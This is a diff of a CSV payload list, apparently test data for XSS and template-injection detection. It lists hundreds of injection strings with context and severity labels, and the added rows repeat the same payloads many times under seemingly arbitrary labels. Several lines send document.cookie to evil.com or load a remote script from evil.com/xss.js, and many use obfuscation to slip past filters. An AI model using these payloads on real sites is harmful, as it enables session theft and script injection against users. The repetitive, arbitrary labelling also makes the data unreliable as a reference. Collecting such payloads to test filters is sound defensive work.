@@ -1,489 +1,445 @@
 payload,context,severity
-&quot; onerror=alert(1) x=&quot;,js_uri,medium
-<BODY ONLOAD=alert(’XSS’)>,html_body,medium
-javascript:confirm(1),attribute,medium
+{{7*7}},template_injection,high
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,medium
+{{7*7}},js_uri,high
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,low
+{{7*7}},template_injection,medium
+{{7*7}},script_injection,medium
+{{7*7}},template_injection,low
+{{7*7}},template_injection,high
+{{7*7}},attribute,high
 {{7*7}},script_injection,low
-javascript:alert(document.domain),js_uri,low
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
-<SCRIPT>alert(1)</SCRIPT>,script_injection,high
-"document.body.innerHTML=""<img src=x onerror=confirm(1)>""",js_uri,high
-<img src=x onerror=al'+'ert(1)>,event_handler,high
-""" onfocus=alert(1) autofocus=""",attribute,medium
-"<iframe src=""javascript:confirm(1)"">",template_injection,medium
-""" onload=alert(1) x=""",script_injection,low
-"<vIdeO	><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",html_body,high
-<%= alert(1) %>,template_injection,medium
-javascript:confirm(1),template_injection,medium
-#{\u0061\u006cert(1)},template_injection,medium
-""" onfocus=alert(1) autofocus=""",attribute,high
-""" onfocus=alert(1) autofocus=""",attribute,low
-&quot; onload=alert(1) x=&quot;,attribute_escape,medium
-"<object data=""javascript:alert(1)"">",tag_injection,medium
-<img src=x onerror=alert(1)>,tag_injection,high
-javascript:alert(document.domain),event_handler,low
-"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",script_injection,low
-"dAtA:TeXt/hTmL,<sCrIpT>AlErT(1)</ScRiPt>",js_uri,low
-javascript:confirm(1),js_uri,high
-' onmouseover=alert(1) ',attribute,medium
-"<img src
-=x onerror
-=alert(	1)>",event_handler,low
-"\""><img src=x onerror=alert(1)>",attribute_escape,medium
+{{7*7}},template_injection,low
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,medium
+{{7*7}},script_injection,low
+{{7*7}},template_injection,medium
+{{7*7}},script_injection,high
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,low
+{{7*7}},script_injection,high
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,low
+{{7*7}},template_injection,high
+{{7*7}},template_injection,low
+{{7*7}},template_injection,low
+{{7*7}},template_injection,low
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,low
+{{7*7}},template_injection,low
+{{7*7}},script_injection,medium
+{{7*7}},template_injection,low
+{{7*7}},template_injection,low
+{{7*7}},template_injection,low
+{{7*7}},template_injection,high
+{{7*7}},js_uri,low
+{{7*7}},template_injection,high
+{{7*7}},template_injection,low
+{{7*7}},template_injection,high
+{{7*7}},js_uri,medium
+{{7*7}},template_injection,low
+{{7*7}},template_injection,medium
+{{7*7}},event_handler,high
+{{7*7}},script_injection,low
+{{7*7}},template_injection,low
+{{7*7}},template_injection,high
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,low
+{{7*7}},script_injection,high
+{{7*7}},template_injection,medium
+{{7*7}},template_injection,high
+{{7*7}},template_injection,high
+{{7*7}},template_injection,low
+{{7*7}},template_injection,high
+{{7*7}},script_injection,low
+{{7*7}},js_uri,high
+{{7*7}},template_injection,low
+{{7*7}},dom_sink,medium
+<SCRIPT>alert(document.domain)</SCRIPT>,script_injection,low
+<SCRIPT>alert(document.domain)</SCRIPT>,event_handler,low
+<SCRIPT>alert(document.domain)</SCRIPT>,script_injection,low
+"data:text/html,<script>alert(1)</script>",js_uri,low
+"data:text/html,<script>alert(1)</script>",js_uri,low
+"data:text/html,<script>alert(1)</script>",attribute,high
+"data:text/html,<script>alert(1)</script>",js_uri,low
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",js_uri,low
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",js_uri,medium
+"data:text/html,<script>alert(1)</script>",js_uri,low
+"data:text/html,<script>alert(1)</script>",js_uri,medium
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",js_uri,medium
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",js_uri,medium
+"data:text/html,<script>alert(1)</script>",js_uri,low
+"data:text/html,<script>alert(1)</script>",template_injection,low
+"data:text/html,<script>alert(1)</script>",js_uri,medium
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",template_injection,low
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",dom_sink,low
+"data:text/html,<script>alert(1)</script>",js_uri,low
+"data:text/html,<script>alert(1)</script>",js_uri,medium
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",js_uri,medium
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",js_uri,high
+"data:text/html,<script>alert(1)</script>",js_uri,high
+%3Csvg/onload=alert(1)%3E,tag_injection,medium
+%3Csvg/onload=alert(1)%3E,tag_injection,low
+%3Csvg/onload=alert(1)%3E,tag_injection,low
+%3Csvg/onload=alert(1)%3E,js_uri,medium
+<script>alert(1)</script>,js_uri,high
+<script>alert(1)</script>,script_injection,high
+<script>alert(1)</script>,script_injection,medium
+<script>alert(1)</script>,script_injection,high
+<script>alert(1)</script>,script_injection,low
+<script>alert(1)</script>,script_injection,low
+<script>alert(1)</script>,tag_injection,low
+<script>alert(1)</script>,attribute_escape,high
+<script>alert(1)</script>,script_injection,high
+<script>alert(1)</script>,script_injection,low
+<script>alert(1)</script>,script_injection,medium
+<script>alert(1)</script>,script_injection,high
+<script>alert(1)</script>,script_injection,high
+<script>alert(1)</script>,script_injection,medium
+<script>alert(1)</script>,script_injection,low
+<script>alert(1)</script>,script_injection,medium
+<script>alert(1)</script>,script_injection,medium
+<script>alert(1)</script>,script_injection,medium
+<script>alert(1)</script>,script_injection,medium
+<script>alert(1)</script>,script_injection,medium
+<script>alert(1)</script>,script_injection,high
+<script>alert(1)</script>,script_injection,high
+"eval(""al'+'ert(1)"")",dom_sink,low
+"eval(""al'+'ert(1)"")",dom_sink,medium
+"eval(""al'+'ert(1)"")",dom_sink,medium
+"eval(""al'+'ert(1)"")",script_injection,high
+"eval(""al'+'ert(1)"")",dom_sink,medium
+"eval(""al'+'ert(1)"")",dom_sink,medium
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,js_uri,low
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,js_uri,high
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,template_injection,low
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,attribute_escape,medium
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,script_injection,high
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,attribute,high
 <svg onload=alert(1)>,event_handler,low
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,event_handler,low
+<svg onload=alert(1)>,tag_injection,medium
+<svg onload=alert(1)>,dom_sink,medium
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,tag_injection,medium
+<svg onload=alert(1)>,event_handler,low
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,event_handler,low
+<svg onload=alert(1)>,event_handler,low
+<svg onload=alert(1)>,event_handler,high
+<svg onload=alert(1)>,event_handler,low
+<svg onload=alert(1)>,event_handler,low
+<svg onload=alert(1)>,event_handler,medium
+<svg onload=alert(1)>,attribute,medium
+<svg onload=alert(1)>,html_body,medium
+<svg onload=alert(1)>,event_handler,high
+<img src/onerror=prompt(8)>,html_body,medium
+<img src/onerror=prompt(8)>,html_body,medium
+' ><img src=x onerror=alert(1)>,tag_injection,high
+' ><img src=x onerror=alert(1)>,attribute,high
+' ><img src=x onerror=alert(1)>,attribute,low
+' ><img src=x onerror=alert(1)>,attribute,high
+' ><img src=x onerror=alert(1)>,attribute,high
+' ><img src=x onerror=alert(1)>,tag_injection,medium
+' ><img src=x onerror=alert(1)>,attribute,high
+' ><img src=x onerror=alert(1)>,attribute,low
+' ><img src=x onerror=alert(1)>,attribute,medium
+' ><img src=x onerror=alert(1)>,attribute,medium
+' ><img src=x onerror=alert(1)>,attribute,low
+' ><img src=x onerror=alert(1)>,attribute,low
+' ><img src=x onerror=alert(1)>,attribute,medium
+' ><img src=x onerror=alert(1)>,attribute,medium
+' ><img src=x onerror=alert(1)>,attribute,low
+' ><img src=x onerror=alert(1)>,attribute,high
+' ><img src=x onerror=alert(1)>,tag_injection,high
+' ><img src=x onerror=alert(1)>,js_uri,medium
+' ><img src=x onerror=alert(1)>,attribute,low
+' ><img src=x onerror=alert(1)>,attribute,low
+"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,medium
+"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
+"<iframe src=""javascr/**/ipt:alert(1)"">",script_injection,medium
+"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
+"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,attribute,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,attribute,medium
+<svg onload=alert()>,attribute,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,html_body,medium
+<svg onload=alert()>,attribute,medium
+<svg onload=alert()>,html_body,medium
+"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,high
+"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",event_handler,low
+"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,low
+"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
+"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
+"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",attribute,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
+<SCRIPT>alert(1)</SCRIPT>,script_injection,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,low
+<SCRIPT>alert(1)</SCRIPT>,tag_injection,medium
+<SCRIPT>alert(1)</SCRIPT>,template_injection,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,high
+<SCRIPT>alert(1)</SCRIPT>,script_injection,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
+<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
+<SCRIPT>alert(1)</SCRIPT>,attribute,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,low
+<SCRIPT>alert(1)</SCRIPT>,js_uri,high
+<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
+<SCRIPT>alert(1)</SCRIPT>,script_injection,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,high
+<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
+<SCRIPT>alert(1)</SCRIPT>,script_injection,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,high
+<SCRIPT>alert(1)</SCRIPT>,event_handler,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,low
+<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
+<SCRIPT>alert(1)</SCRIPT>,template_injection,low
+onload='window.alert(1)',html_body,medium
+\x3cbody onload=alert(1)\x3e,attribute_escape,low
+\x3cbody onload=alert(1)\x3e,event_handler,medium
+\x3cbody onload=alert(1)\x3e,tag_injection,high
+' oNmOuSeOvEr=aLeRt(1) ',attribute,medium
+' oNmOuSeOvEr=aLeRt(1) ',attribute,high
+' oNmOuSeOvEr=aLeRt(1) ',attribute,medium
+' oNmOuSeOvEr=aLeRt(1) ',attribute,medium
+' oNmOuSeOvEr=aLeRt(1) ',tag_injection,low
+' onerror=confirm(1) x=',attribute,high
+' onerror=confirm(1) x=',attribute,medium
+' onerror=confirm(1) x=',template_injection,high
+"onload=""self.alert(1)""",html_body,medium
+\' OnErRoR=AlErT(1)//,attribute_escape,high
+\' OnErRoR=AlErT(1)//,attribute_escape,high
+\' OnErRoR=AlErT(1)//,attribute_escape,medium
+\' OnErRoR=AlErT(1)//,attribute_escape,medium
+"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
+\x3csvg onload=alert(1)\x3e,attribute_escape,high
+\x3csvg onload=alert(1)\x3e,event_handler,medium
+\x3csvg onload=alert(1)\x3e,attribute_escape,medium
+OnLOAD='aLERt(1)',html_body,medium
+"<ObJeCt dAtA=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
+"<ObJeCt dAtA=""jAvAsCrIpT:AlErT(1)"">",tag_injection,low
+onload='alert(1)',html_body,medium
+onload='alert(1)',html_body,medium
+onload='alert(1)',html_body,medium
+onload='alert(1)',attribute,medium
+onload='alert(1)',html_body,medium
+onload='alert(1)',attribute,medium
+onload='alert(1)',attribute,medium
+onload='alert(1)',html_body,medium
+onload='alert(1)',attribute,medium
+onload='alert(1)',attribute,medium
+onload='alert(1)',html_body,medium
+onload='alert(1)',attribute,medium
+onload='alert(1)',html_body,medium
+onload='alert(1)',html_body,medium
+onload='alert(1)',attribute,medium
+onload='alert(1)',html_body,medium
+onload='alert(1)',attribute,medium
+javascript:alert(	1),tag_injection,medium
+javascript:alert(	1),attribute,medium
+javascript:alert(	1),js_uri,medium
+"<details open ontoggle
+=alert(	1)>",event_handler,medium
+"<details open ontoggle
+=alert(	1)>",event_handler,medium
+"<details open ontoggle
+=alert(	1)>",event_handler,low
+"<details open ontoggle
+=alert(	1)>",event_handler,high
+"<details open ontoggle
+=alert(	1)>",js_uri,medium
+"<details open ontoggle
+=alert(	1)>",event_handler,low
+""" onload=confirm(1) x=""",attribute,high
+""" onload=confirm(1) x=""",attribute,high
+""" onload=confirm(1) x=""",attribute,low
+<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,event_handler,high
+<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,event_handler,low
+<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,event_handler,low
+"<iframe src=""javascript:confirm(1)"">",script_injection,medium
+"<iframe src=""javascript:confirm(1)"">",tag_injection,low
+"<iframe src=""javascript:confirm(1)"">",tag_injection,high
+"<iframe src=""javascript:confirm(1)"">",attribute,high
+"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
+"<iframe src=""javascript:confirm(1)"">",tag_injection,high
+"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
+"<iframe src=""javascript:confirm(1)"">",template_injection,medium
+"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
+"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
+"onload=""print()""",html_body,medium
+<%= al'+'ert(1) %>,template_injection,medium
+<%= al'+'ert(1) %>,template_injection,medium
+<%= al'+'ert(1) %>,template_injection,low
+<%= al'+'ert(1) %>,template_injection,low
+<%= al'+'ert(1) %>,template_injection,high
+<%= al'+'ert(1) %>,template_injection,medium
+"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,low
+"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,medium
+"sEtTiMeOuT(""aLeRt(1)"",0)",event_handler,medium
+"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,medium
+<%= confirm(1) %>,template_injection,high
+<%= confirm(1) %>,template_injection,high
+<%= confirm(1) %>,js_uri,medium
+<%= confirm(1) %>,event_handler,low
+<%= confirm(1) %>,attribute,high
+<%= confirm(1) %>,js_uri,medium
+<%= confirm(1) %>,template_injection,low
+javascript:al'+'ert(1),js_uri,low
+javascript:al'+'ert(1),js_uri,medium
+javascript:prompt(1),url,medium
+' \x3e\x3cimg src=x onerror=alert(1)\x3e,attribute,medium
+' \x3e\x3cimg src=x onerror=alert(1)\x3e,attribute,low
+' \x3e\x3cimg src=x onerror=alert(1)\x3e,js_uri,high
+"location=""javascript:al'+'ert(1)""",dom_sink,high
+"location=""javascript:al'+'ert(1)""",tag_injection,medium
+"location=""javascript:al'+'ert(1)""",dom_sink,high
+"location=""javascript:al'+'ert(1)""",dom_sink,low
+j\u0061v\u0061script:confirm(1),js_uri,high
+j\u0061v\u0061script:confirm(1),js_uri,medium
+j\u0061v\u0061script:confirm(1),js_uri,medium
+j\u0061v\u0061script:confirm(1),js_uri,high
+j\u0061v\u0061script:confirm(1),js_uri,high
+"ev\u0061\u006c(""\u0061\u006cert(1)"")",dom_sink,high
+"ev\u0061\u006c(""\u0061\u006cert(1)"")",dom_sink,high
+<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,high
+<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,medium
+<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,high
+<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,low
+<SCRIPT src=//evil.com/xss.js></SCRIPT>,dom_sink,low
+<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,medium
+"<embed src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",event_handler,high
+"<embed src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",script_injection,medium
+onload='confirm(1)',html_body,medium
+pRoMpT(9),attribute,medium
+"<object data=""javascript:confirm(1)"">",attribute_escape,low
+"<object data=""javascript:confirm(1)"">",tag_injection,low
+"<object data=""javascript:confirm(1)"">",tag_injection,high
+"<object data=""javascript:confirm(1)"">",tag_injection,medium
+"<object data=""javascript:confirm(1)"">",js_uri,medium
+"<object data=""javascript:confirm(1)"">",tag_injection,low
+"<object data=""javascript:confirm(1)"">",tag_injection,low
+"<object data=""javascript:confirm(1)"">",tag_injection,low
+"<object data=""javascript:confirm(1)"">",tag_injection,high
+"location=""javaSCRIPT:alert(1)""",tag_injection,medium
+"location=""javaSCRIPT:alert(1)""",dom_sink,medium
+"""><svg onload=alert(1)>",html_body,medium
+"""><svg onload=alert(1)>",attribute,medium
+"""><svg onload=alert(1)>",attribute,medium
+"""><svg onload=alert(1)>",attribute,medium
+"""><svg onload=alert(1)>",html_body,medium
+"""><svg onload=alert(1)>",attribute,medium
+"""><marquee>alert(String.fromCharCode(88,83,83))</script>",html_body,high
+"<script>document.location
+=""http://evil.com/?c
+=""+document.cookie</script>",script_injection,low
+""" onload
+=alert(	1) x
+=""",attribute,medium
+""" onload
+=alert(	1) x
+=""",attribute,low
+""" onload
+=alert(	1) x
+=""",attribute,high
+"//"";window.alert(1))",html_body,high
+javascript:al'+'ert(document.domain),js_uri,low
+prompt`1`,attribute,medium
+"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,high
+"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,medium
+"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,medium
+"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,low
+"ONERRor=""AlerT(1)""",html_body,medium
+""" oNfOcUs=aLeRt(1) AuToFoCuS=""",script_injection,high
+""" oNfOcUs=aLeRt(1) AuToFoCuS=""",attribute,high
+<body onload=al'+'ert(1)>,event_handler,high
+<body onload=al'+'ert(1)>,event_handler,medium
+<marquee onstart=confirm(1)>,script_injection,low
+<marquee onstart=confirm(1)>,dom_sink,low
+<marquee onstart=confirm(1)>,event_handler,low
+<svg onload=confirm(1)>,event_handler,high
+<svg onload=confirm(1)>,html_body,medium
+"<marquee onstart
+=alert(	1)>",event_handler,medium
+"<marquee onstart
+=alert(	1)>",event_handler,medium
+;confirm`1`;,attribute,medium
+"onerror=""alert(document.cookie)""",html_body,medium
+"onerror=""alert(document.cookie)""",html_body,medium
+"<SCRiPt>D.INNeRHtMl+='';</SCRipt>//[""'`-->]]>]</dIv>",attribute,high
+""" onfocus=confirm(1) autofocus=""",script_injection,medium
+ONLoaD='AleRt(1)',attribute,medium
+"{{constructor.constructor(""\u0061\u006cert(1)"")()}}",template_injection,medium
+"{{constructor.constructor(""\u0061\u006cert(1)"")()}}",tag_injection,low
+"""><svG OnLoaD=ALerT(1)>",attribute,medium
+"\""><img src
+=x onerror
+=alert(	1)>",attribute_escape,medium
+<script>al'+'ert(document.domain)</script>,script_injection,high
+<script>al'+'ert(document.domain)</script>,script_injection,high
+""" onfocus=\u0061\u006cert(1) \u0061utofocus=""",attribute,medium
+"""><iframe onload=alert(1);>",html_body,medium
+<svg Onload=aleRT()>,html_body,medium
+-alErT(23)/,attribute,medium
+"<table>alert(String.fromCharCode(88,83,83))</script>",html_body,high
+<svg ONLoaD=ALeRt()>,attribute,medium
+onsearch='alert(1)',attribute,medium
+\u003e\u003cimg src=1 oncut=alert(0)\u003e,attribute,medium
+"\' onerror
+=alert(	1)//",attribute_escape,low
+"\' onerror
+=alert(	1)//",js_uri,low
+\x3cvideo src=x onerror=alert(1)\x3e,event_handler,medium
+#javascript:alert(1),url,medium
 "document.body.innerHTML
 =""<img src
 =x onerror
 =alert(	1)>""",dom_sink,medium
-<SvG OnLoAd=aLeRt(1)>,event_handler,high
-"eval(""alert(1)"")",attribute_escape,high
-onerror='alert(1)',html_body,medium
-<select>d.innerHTML+='';</script>,html_body,high
-"location=""javascript:alert(1)""",dom_sink,low
-<ImG SrC=X OnErRoR=AlErT(1)>,tag_injection,high
-${alert(1)},template_injection,medium
-"location=""javascript:alert(1)""",dom_sink,low
-"javascript:void(document.location=""http://evil.com"")",js_uri,low
-<svg onload=alert()>,html_body,medium
-${alert(1)},template_injection,medium
-<svg/onload=alert(1)>,tag_injection,medium
-javascript:confirm(1),attribute,low
-' \x3e\x3cimg src=x onerror=alert(1)\x3e,js_uri,high
-"setTimeout(""alert(1)"",0)",dom_sink,medium
-"document.write(""<img src=x onload=alert(1)>"")",template_injection,low
-"&quot; onerror
-=alert(	1) x
-=&quot;",attribute_escape,medium
-<img/src/onerror=alert(1),html_body,medium
-<img src=x onload=alert(1)>,tag_injection,medium
-' onmouseover=alert(1) ',attribute,medium
-<script>confirm(document.domain)</script>,template_injection,medium
-javascript:confirm(	1),js_uri,high
-onERROR='AlErt(1)',html_body,medium
-""" onload=alert(1) x=""",event_handler,medium
-"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e",script_injection,high
-""" onerror=confirm(1) x=""",script_injection,medium
-<img src=x onload=alert(1)>,event_handler,medium
-<%= alert(1) %>,template_injection,medium
-"<object data=""javascript:alert(1)"">",attribute_escape,low
-<script>confirm(1)</script>,script_injection,low
-<script src=//evil.com/xss.js></script>,script_injection,high
-javascript:confirm(1),js_uri,high
-"""><svg onload=alert(1)>",html_body,medium
-<svg onload=alert()>,html_body,medium
-"""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute,high
-"data:text/html,<script>alert(1)</script>",template_injection,low
-</tag><svg onload=alert(1)>,attribute,medium
-"\"" onload=alert(1)//",dom_sink,low
-{{7*7}},js_uri,high
-"\""><iMg sRc=x oNeRrOr=aLeRt(1)>",attribute_escape,medium
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
-' ><img src=x onerror=alert(1)>,js_uri,medium
-<video src=x onerror=alert(1)>,event_handler,low
-"<embed src=""javascript:alert(1)"">",script_injection,high
-<video src=x onerror=alert(1)>,event_handler,medium
-' onerror=alert(1) x=',attribute,high
-""" onerror
-=alert(	1) x
-=""",attribute,low
-<svg src=x onerror=alert(1)>,tag_injection,high
-"""><img src=x onerror=alert(1)>",script_injection,high
-onload='alert(1)',html_body,medium
-"data:text/html,<script>alert(1)</script>",js_uri,high
-' onerror=alert(1) x=',attribute,low
-javascript:alert(1),js_uri,low
-javascript:alert(1),js_uri,medium
-"javascript:void(document.location=""http://evil.com"")",js_uri,high
-' onmouseover=alert(1) ',attribute,medium
-<%= \u0061\u006cert(1) %>,template_injection,high
-onload='self.alert(1)',html_body,medium
-<script>alert(1)</script>,script_injection,medium
-<input onfocus=alert(1) autofocus>,event_handler,medium
-<body onload=alert(1)>,event_handler,medium
-javascript:alert(1),js_uri,high
-<%= alert(1) %>,template_injection,medium
-"javascript:void(document.location=""http://evil.com"")",js_uri,medium
-"\""><img src=x onerror=alert(1)>",attribute_escape,medium
-<img src=x onerror=alert(1)>,event_handler,high
-<video src=x onerror=alert(1)>,event_handler,medium
-"<embed src=""javaSCRIPT:alert(1)"">",script_injection,medium
-<image src/onerror=alert(1)>,html_body,medium
-javascript:confirm(1),js_uri,medium
-""" onload=alert(1) x=""",tag_injection,high
-""" onload=alert(1) x=""",event_handler,low
-"onerror=""alert(1)""",html_body,medium
-<SvG/OnLoAd=aLeRt(1)>,tag_injection,low
-"\""><img src=x onload=alert(1)>",attribute_escape,high
-"location=""javascript:alert(1)""",dom_sink,low
-&quot; onerror=alert(1) x=&quot;,script_injection,low
-&quot; onerror=alert(1) x=&quot;,attribute_escape,low
-\x3cimg/src=x onerror=alert(1)//\x3e,event_handler,high
-<svg onload=alert(1)>,event_handler,medium
-javascript:alert(1),attribute,high
-<script>confirm(1)</script>,script_injection,medium
-"\""><img src=x onerror=alert(1)>",attribute_escape,low
-<body onload=alert(1)>,event_handler,high
-<table/onload=alert(0);>,html_body,medium
-' onmouseover=alert(1) ',attribute,low
-<img src=x onerror=\u0061\u006cert(1)>,event_handler,medium
-\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,attribute,medium
-"<embed src=""javascript:alert(1)"">",tag_injection,medium
-<script>confirm(1)</script>,script_injection,high
-<script>confirm(1)</script>,event_handler,medium
-"setTimeout(""alert(1)"",0)",dom_sink,medium
-<script>confirm(1)</script>,script_injection,high
-<script>alert(1)</script>,script_injection,high
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
-<svg src=x onerror=alert(1)>,dom_sink,low
-"eval(""alert(1)"")",dom_sink,medium
-<script>prompt(1)</script>,script_injection,high
-"document.write(""&lt;img src=x onerror=alert(1)&gt;"")",attribute_escape,low
-""" onfocus=alert(1) autofocus=""",js_uri,medium
-<marquee onstart=alert(1)>,event_handler,low
-<details open ontoggle=alert(1)>,attribute_escape,high
-"\"" OnErRoR=AlErT(1)//",attribute_escape,medium
-"<scr/**/ipt>document.location=""http://evil.com/?c=""+document.cookie</scr/**/ipt>",script_injection,high
-#{al'+'ert(1)},template_injection,low
-<SCRIPT>prompt(1)</SCRIPT>,script_injection,medium
-${alert(	1)},template_injection,medium
-' ><img src=x onerror=alert(1)>,attribute,low
-javascript:confirm(1),js_uri,high
-""" onerror=alert(1) x=""",attribute,low
-"<object data=""javascript:confirm(1)"">",tag_injection,high
-"javaSCRIPT:void(document.location=""http://evil.com"")",js_uri,low
-"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
-"{{cOnStRuCtOr.cOnStRuCtOr(""AlErT(1)"")()}}",template_injection,high
-<SCRIPT>alert(1)</SCRIPT>,event_handler,low
-"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
-"\""><img src=x onerror=alert(1)>",attribute_escape,high
-<script src=//evil.com/xss.js></script>,script_injection,high
-<svg/onload=alert(1)>,tag_injection,low
-' onerror=alert(1) x=',js_uri,medium
-javascript:confirm(1),js_uri,high
-' onmouseover=\u0061\u006cert(1) ',attribute,medium
-<script src=//evil.com/xss.js></script>,event_handler,medium
-<details open ontoggle=alert(1)>,event_handler,high
-javascript:alert(document.domain),js_uri,low
-"<embed src=""javascript:confirm(1)"">",attribute,medium
-"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",attribute,low
-<scr/**/ipt>alert(document.domain)</scr/**/ipt>,template_injection,high
-<video src=x onerror=al'+'ert(1)>,event_handler,high
-' onmouseover=\u0061\u006cert(1) ',js_uri,low
-&lt;img src=x onerror=alert(1)&gt;,tag_injection,low
-javascript:alert(document.domain),event_handler,medium
-\x3cimg/src=x onerror=alert(1)//\x3e,attribute_escape,low
-<img src=x onerror=confirm(1)>,tag_injection,low
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",event_handler,medium
-<input onfocus=confirm(1) autofocus>,event_handler,low
-<img/src=x onerror=alert(1)//>,event_handler,high
-"setTimeout(""alert(1)"",0)",dom_sink,low
-<svg/onload=alert(1)>,tag_injection,low
-<SvG/OnLoAd=aLeRt(1)>,tag_injection,medium
-<SCRIPT>alert(1)</SCRIPT>,script_injection,low
-"data:text/html,<script>alert(1)</script>",dom_sink,low
-<img src=x onerror=alert(1)>,tag_injection,medium
